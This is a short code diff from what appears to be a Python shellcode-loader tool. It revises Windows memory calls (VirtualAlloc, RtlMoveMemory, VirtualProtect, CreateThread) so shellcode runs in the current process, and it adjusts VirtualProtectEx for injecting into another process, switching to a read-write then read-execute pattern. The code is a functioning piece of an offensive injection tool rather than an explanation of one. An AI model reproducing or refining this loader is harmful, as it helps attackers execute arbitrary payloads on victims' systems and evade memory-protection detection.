@@ -188,12 +188,14 @@ ____________________________________________________________
 [*] =============================================""")
         memptr = self.VirtualAlloc(
             0, len(self.shellcode),
-            self.MEM_COMMIT, self.PAGE_READWRITE_EXECUTE
+            self.MEM_COMMIT_RESERVE,
+            self.PAGE_READWRITE
         )
         print('[*] VirtuallAlloc() Memory at: {:08X}'.format(memptr))
         self.RtlMoveMemory(memptr, self.shellcode, len(self.shellcode))
         print('[*] Shellcode copied into memory.')
-        self.VirtualProtect(memptr, len(self.shellcode), self.PAGE_READ_EXECUTE, 0)
+        oldp = ctypes.pointer(wt.DWORD())
+        self.VirtualProtect(memptr, len(self.shellcode), self.PAGE_READ_EXECUTE, oldp)
         print('[*] Changed permissions on memory to READ_EXECUTE only.')
         thread = self.CreateThread(0, 0, memptr, 0, 0, 0)
         print('[*] CreateThread() in same process.')
@@ -233,10 +235,10 @@ ____________________________________________________________
             ))
             return
 
-        old_protection = ctypes.pointer(wt.DWORD())
+        oldp = ctypes.pointer(wt.DWORD())
         result = self.VirtualProtectEx(
             ph, memptr, len(self.shellcode),
-            self.PAGE_READ_EXECUTE, old_protection
+            self.PAGE_READ_EXECUTE, oldp
         )
         if result == 0:
             print("[-] VirtualProtectEx() Failed - Error Code: {}".format(
